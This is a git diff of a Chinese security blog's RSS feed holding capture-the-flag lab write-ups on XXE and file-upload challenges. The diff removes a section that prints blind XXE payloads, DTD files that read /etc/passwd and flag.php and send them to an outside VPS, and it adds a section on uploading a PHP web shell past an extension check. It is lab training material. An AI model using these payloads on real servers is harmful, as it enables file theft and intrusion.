@@ -6,7 +6,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>This is a customized copyright.</copyright>
-    <lastBuildDate>Tue, 07 Jul 2020 22:33:20 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 07 Jul 2020 23:35:20 +0800</lastBuildDate>
     
         <atom:link href="https://b40du.github.io/index.xml" rel="self" type="application/rss+xml" />
     
@@ -14,11 +14,11 @@
     
         <item>
         <title>Writeup 之 业务逻辑 魔改flag版</title>
-        <link>https://b40du.github.io/posts/writeup-chaitin-upload_logic-01/</link>
-        <pubDate>Tue, 07 Jul 2020 22:33:20 +0800</pubDate>
+        <link>https://b40du.github.io/posts/writeup-chaitin-business_logic-01/</link>
+        <pubDate>Tue, 07 Jul 2020 23:35:20 +0800</pubDate>
         
-        <guid>https://b40du.github.io/posts/writeup-chaitin-upload_logic-01/</guid>
-        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-upload_logic-01/ -&lt;p&gt;由于靶场被频繁扫描，断连率颇高，&lt;code&gt;dedecms&lt;/code&gt;使用本地搭建进行测试。&lt;/p&gt;
+        <guid>https://b40du.github.io/posts/writeup-chaitin-business_logic-01/</guid>
+        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-business_logic-01/ -&lt;p&gt;由于靶场被频繁扫描，断连率颇高，&lt;code&gt;dedecms&lt;/code&gt;使用本地搭建进行测试。&lt;/p&gt;
 &lt;h1 id=&#34;1-越权dedecms&#34;&gt;1. 越权dedecms&lt;/h1&gt;
 &lt;p&gt;首先进入靶场首页，是个经典的&lt;code&gt;dedecms&lt;/code&gt;建站系统。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707220858.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
@@ -118,231 +118,7 @@
 &lt;blockquote&gt;
 &lt;p&gt;flag{easyeasyeasy}&lt;/p&gt;
 &lt;/blockquote&gt;
-- https://b40du.github.io/posts/writeup-chaitin-upload_logic-01/ - This is a customized copyright.</description>
-        </item>
-    
-    
-    
-        <item>
-        <title>Writeup 之 XXE-Labs 魔改flag版</title>
-        <link>https://b40du.github.io/posts/writeup-chaitin-business-01-%E5%89%AF%E6%9C%AC/</link>
-        <pubDate>Mon, 06 Jul 2020 23:56:33 +0800</pubDate>
-        
-        <guid>https://b40du.github.io/posts/writeup-chaitin-business-01-%E5%89%AF%E6%9C%AC/</guid>
-        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-business-01-%E5%89%AF%E6%9C%AC/ -&lt;h1 id=&#34;1-xxe实验室&#34;&gt;1. xxe实验室&lt;/h1&gt;
-&lt;p&gt;前三个比较简单，直接进入第四个&lt;/p&gt;
-&lt;p&gt;首先我们要明确&lt;code&gt;Blind XXE&lt;/code&gt;的用途，对于传统的&lt;code&gt;XXE&lt;/code&gt;来说，必须要求服务器有回显或者报错，才能使用&lt;code&gt;XXE&lt;/code&gt;读取服务器端的文件。如果服务器没有回显，只能使用&lt;code&gt;Blind XXE&lt;/code&gt;漏洞来构建一条带外信道提取数据。&lt;/p&gt;
-&lt;p&gt;那么从源代码来看，前几个和第四个有何不同呢&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;&lt;code&gt;DOMDocument.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707023900.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;&lt;code&gt;SimpleXMLElement.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024003.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;&lt;code&gt;simplexml_load_string.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024044.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;&lt;code&gt;BlindXXE.php&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024120.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;我们发现&lt;code&gt;BlindXXE.php&lt;/code&gt;的源代码，直接去掉了回显，没有打印变量，保存到缓冲区的步骤。&lt;/p&gt;
-&lt;p&gt;找到了根本区别，直接寻找&lt;code&gt;flag&lt;/code&gt;吧。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;简单的方法，直接在有回显的地方使用&lt;code&gt;php&lt;/code&gt;的&lt;code&gt;filter&lt;/code&gt;协议读取文件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707024848.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后&lt;code&gt;base64&lt;/code&gt;解密，得到&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707025042.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;flag{xxe_easy}&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;2-短信&#34;&gt;2. 短信&lt;/h1&gt;
-&lt;ul&gt;
-&lt;li&gt;进入靶场首页，发现一个类似cms的商务站页面&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005349.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;四处点点看看，发现一个论坛&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005458.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;看看能不能注册，发现管理员禁止了注册&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005607.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;尝试登录，发现每次都需要滑块认证&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005923.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;那么还是上大杀器，目录扫描吧，御剑跑起来&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707010155.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;而在这其中呢，&lt;code&gt;/readme.txt&lt;/code&gt;文件中有很明显的线索，告诉我们这是一个S-CMS建站系统&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020436.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后我们对其进行搜索，看看有没有可以利用的漏洞，发现大都是CNVD录入的SQL注入漏洞，同时看到很多文章都是对这种CMS进行源代码审计查找漏洞的，我们不妨把源程序下载下来，由于是老版本的靶场，特地找了一个老版本的进行下载&lt;/li&gt;
-&lt;li&gt;然后我们手动的搜索容易产生&lt;code&gt;XXE&lt;/code&gt;漏洞的标志性函数&lt;code&gt;simplexml_load_string()&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;PHP 中的以 &lt;code&gt;simplexml_load&lt;/code&gt; 开头的函数默认会解析外部实体，有 XXE 漏洞的标志性函数为 &lt;code&gt;simplexml_load_string()&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;ul&gt;
-&lt;li&gt;经过反复实验，找到一个非常可疑的页面，该页面是&lt;code&gt;api&lt;/code&gt;目录下的&lt;code&gt;notify.php&lt;/code&gt;页面，这里的&lt;code&gt;$GLOBALS[&#39;HTTP_RAW_POST_DATA&#39;]&lt;/code&gt;函数，和&lt;code&gt;php://input&lt;/code&gt;的传参方式是一样的，但后面没有对&lt;code&gt;libxml&lt;/code&gt;进行过滤，直接就传入了&lt;code&gt;simplexml_load_string()&lt;/code&gt;函数&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020415.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后我们看看最新版的&lt;code&gt;CMS&lt;/code&gt;改成了什么样子，发现多了一个&lt;code&gt;libxml_disable_entity_loader(true)&lt;/code&gt;进行保护&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707012740.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;网页访问该页面，不会爆出页面不存在的错误，我们使用&lt;code&gt;burp&lt;/code&gt;抓包，并发送&lt;code&gt;xml&lt;/code&gt;类型的&lt;code&gt;post&lt;/code&gt;请求看看&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;在服务器端构造&lt;code&gt;.dtd&lt;/code&gt;文件&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;?xml version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt; encoding&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;?&amp;gt;
-&amp;lt;!ENTITY % file SYSTEM &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php://filter/convert.base64-encode/resource=file:///etc/passwd&amp;#34;&lt;/span&gt;&amp;gt;
-&amp;lt;!ENTITY % all &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;!ENTITY send SYSTEM &amp;#39;http://本人vps的ip:7890/?%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&amp;gt;%all;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707014811.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后使用&lt;code&gt;python3&lt;/code&gt;快速地构造一个&lt;code&gt;http&lt;/code&gt;服务&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015008.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
-&amp;lt;!DOCTYPE root [
-&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://本人vps的ip:7890&amp;quot;/xxe.dtd&amp;quot;&amp;gt;%remote;]&amp;gt;
-&amp;lt;comment&amp;gt;
-&amp;lt;text&amp;gt;test&amp;amp;send;&amp;lt;/text&amp;gt;
-&amp;lt;/comment&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015330.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后发现服务器端的监听有了反应，出来了&lt;code&gt;/etc/passwd&lt;/code&gt;经过&lt;code&gt;base64&lt;/code&gt;加密后字符&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015433.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;那么我们换成查询&lt;code&gt;flag&lt;/code&gt;的&lt;code&gt;.dtd&lt;/code&gt;文件，但是我们并不知道&lt;code&gt;flag&lt;/code&gt;在哪里，就尝试比较常见的几个&lt;code&gt;flag&lt;/code&gt;位置&lt;code&gt;flag.php&lt;/code&gt;、&lt;code&gt;/var/www/html/flag.php&lt;/code&gt;、&lt;code&gt;/flag&lt;/code&gt;等等&lt;/li&gt;
-&lt;li&gt;最后我们发现正确的&lt;code&gt;flag&lt;/code&gt;位置在&lt;code&gt;/flag&lt;/code&gt;，发送请求，并获取加密后的字符串&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015655.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015759.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;使用工具进行&lt;code&gt;base64&lt;/code&gt;解密（https://tool.leavesongs.com/），得到flag&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015917.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;flag{simple_phpxxe}&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;3-web-xxe1&#34;&gt;3. web-xxe1&lt;/h1&gt;
-&lt;ul&gt;
-&lt;li&gt;首先登入靶场首页，发现调皮的Hello DaLao：&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020552.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;发现没有什么东西，御剑跑起来看看，发现好像只有首页和&lt;code&gt;flag.php&lt;/code&gt;，而&lt;code&gt;flag.php&lt;/code&gt;并不能直接查看&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707020907.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;我们之前扫描到了一个&lt;code&gt;flag.php&lt;/code&gt;文件，可以考虑通过&lt;code&gt;XXE&lt;/code&gt;漏洞直接读取这个文件，看看有没有效果&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707021455.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;那么我们使用使用&lt;code&gt;burp&lt;/code&gt;抓包，并发送&lt;code&gt;xml&lt;/code&gt;类型的&lt;code&gt;post&lt;/code&gt;请求看看&lt;/li&gt;
-&lt;li&gt;在服务器端构造&lt;code&gt;.dtd&lt;/code&gt;文件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php://filter/read=convert.base64-encode/resource=flag.php&amp;#34;&lt;/span&gt;&amp;gt;
-&amp;lt;!ENTITY % mmm &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;!ENTITY xxe SYSTEM &amp;#39;http://本人vps的ip:7890/%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&amp;gt;
-%mmm;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022114.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后使用&lt;code&gt;python3&lt;/code&gt;快速地构造一个&lt;code&gt;http&lt;/code&gt;服务&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707015008.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
-&amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://本人vps的ip:7890/mmm.dtd&amp;quot;&amp;gt;
-&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022028.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;我们发现服务器监听端口有了反应，返回了一串&lt;code&gt;base64&lt;/code&gt;加密后字符串，解密后是&lt;code&gt;flag&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022204.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;使用工具进行&lt;code&gt;base64解密&lt;/code&gt;（https://tool.leavesongs.com/），得到flag&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707022310.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;flag{xxeisnotsafe}&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h1 id=&#34;4-web-xxe2&#34;&gt;4. web-xxe2&lt;/h1&gt;
-&lt;ul&gt;
-&lt;li&gt;首先登入靶场首页，发现Apache2 Ubuntu默认页面，猜测可能存在隐藏目录&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004220.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;先上扫描器扫一下&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004151.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;发现了登录页面，我们访问一下看看&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004606.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;由于是&lt;code&gt;XXE&lt;/code&gt;的考题，我们直接登录抓包看看，发现是&lt;code&gt;xml&lt;/code&gt;类型，看来是&lt;code&gt;XXE&lt;/code&gt;没跑了&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004800.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;反复构造几个不同的请求包过去，看看&lt;code&gt;response&lt;/code&gt;有什么变化没有，发现没有返回其他东西，需要带外方式将数据传出&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707004920.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;我们之前扫描到了一个&lt;code&gt;flag.php&lt;/code&gt;文件，可以考虑通过&lt;code&gt;XXE&lt;/code&gt;漏洞直接读取这个文件，看看有没有效果&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707002319.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;首先在服务器上构造&lt;code&gt;.dtd&lt;/code&gt;文件&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&amp;lt;!ENTITY % file SYSTEM &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;php://filter/read=convert.base64-encode/resource=flag.php&amp;#34;&lt;/span&gt;&amp;gt;
-&amp;lt;!ENTITY % mmm &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;!ENTITY xxe SYSTEM &amp;#39;http://本人vps的ip:7890/%file;&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&amp;gt;
-%mmm;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707002418.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后使用&lt;code&gt;python3&lt;/code&gt;快速地构造一个&lt;code&gt;http&lt;/code&gt;服务&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707003518.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;然后构造&lt;code&gt;post&lt;/code&gt;请求包，并发送&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;
-&amp;lt;!DOCTYPE xxe SYSTEM &amp;quot;http://本人vps的ip:7890/mmm.dtd&amp;quot;&amp;gt;
-&amp;lt;send&amp;gt;&amp;lt;username&amp;gt;&amp;amp;xxe;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/send&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707005212.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;我们发现服务器监听端口有了反应，返回了一串&lt;code&gt;base64&lt;/code&gt;加密数据&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707003047.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;使用工具对其进行解密，解密后得到&lt;code&gt;flag&lt;/code&gt;（https://tool.leavesongs.com/）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200707003441.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;flag{Hje60Ui1Na4LdxA8}&lt;/p&gt;
-&lt;/blockquote&gt;
-- https://b40du.github.io/posts/writeup-chaitin-business-01-%E5%89%AF%E6%9C%AC/ - This is a customized copyright.</description>
+- https://b40du.github.io/posts/writeup-chaitin-business_logic-01/ - This is a customized copyright.</description>
         </item>
     
     
@@ -567,6 +343,348 @@
 &lt;p&gt;flag{Hje60Ui1Na4LdxA8}&lt;/p&gt;
 &lt;/blockquote&gt;
 - https://b40du.github.io/posts/writeup-chaitin-xxe_labs-01/ - This is a customized copyright.</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Writeup 之 Upload-Labs 魔改flag版</title>
+        <link>https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/</link>
+        <pubDate>Sat, 04 Jul 2020 23:22:33 +0800</pubDate>
+        
+        <guid>https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/</guid>
+        <description>爆肚的杂货铺 https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/ -&lt;h1 id=&#34;今日总结&#34;&gt;今日总结：&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;这次靶场主要是做这个有源码的靶场，所以理解源码的含义非常重要&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;上传实验室-p1&#34;&gt;上传实验室-p1&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;第一关很简单，直接上传&lt;code&gt;1.php&lt;/code&gt;，发现前端&lt;code&gt;js&lt;/code&gt;报错&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190945.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;推测是前端&lt;code&gt;js&lt;/code&gt;检查文件后缀类型，查看&lt;code&gt;js&lt;/code&gt;代码，发现&lt;code&gt;js&lt;/code&gt;对文件后缀进行了判断&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190823.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;个人习惯直接在控制台重写这个函数而不是用插件，直接在控制台增加&lt;code&gt;.php&lt;/code&gt;类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190857.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;上传完成后，复制上传文件的地址&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705190922.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用菜刀进行连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191033.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;查看flag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;flag{a6487868}&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;上传实验室-p2&#34;&gt;上传实验室-p2&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;由于可以查看源码，直接看源码
+&lt;ul&gt;
+&lt;li&gt;发现后端在判断文件类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191740.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;我们尝试发一个1.php文件，但是改了centent-type类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200705191843.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
